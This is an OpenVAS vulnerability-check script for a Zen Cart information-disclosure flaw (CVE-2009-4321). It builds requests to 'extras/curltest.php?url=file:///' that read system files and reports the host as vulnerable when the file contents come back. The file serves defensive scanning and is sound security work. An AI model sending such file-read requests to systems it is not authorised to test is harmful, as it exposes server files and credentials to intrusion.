###############################################################################
# OpenVAS Vulnerability Test
# $Id: zen_cart_37283.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Zen Cart 'extras/curltest.php' Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Zen Cart is prone to an information-disclosure vulnerability because
it fails to sufficiently sanitize user-supplied data.

An attacker can exploit this issue to view local files in the context
of the webserver process. This may allow the attacker to obtain
sensitive information; other attacks are also possible.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100402");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-12-16 12:39:06 +0100 (Wed, 16 Dec 2009)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_cve_id("CVE-2009-4321");
 script_bugtraq_id(37283);

 script_name("Zen Cart 'extras/curltest.php' Information Disclosure Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/37283");
 script_xref(name : "URL" , value : "http://www.acunetix.com/blog/websecuritynews/acusensor-curl-and-zen-cart/");
 script_xref(name : "URL" , value : "http://www.zen-cart.com/forum/showthread.php?t=142784");
 script_xref(name : "URL" , value : "http://www.zen-cart.com/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/zen-cart", "/zencart", "/cart", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {

    url = string(dir, "/extras/curltest.php?url=file:///", files[file]);

    if(http_vuln_check(port:port, url:url,pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
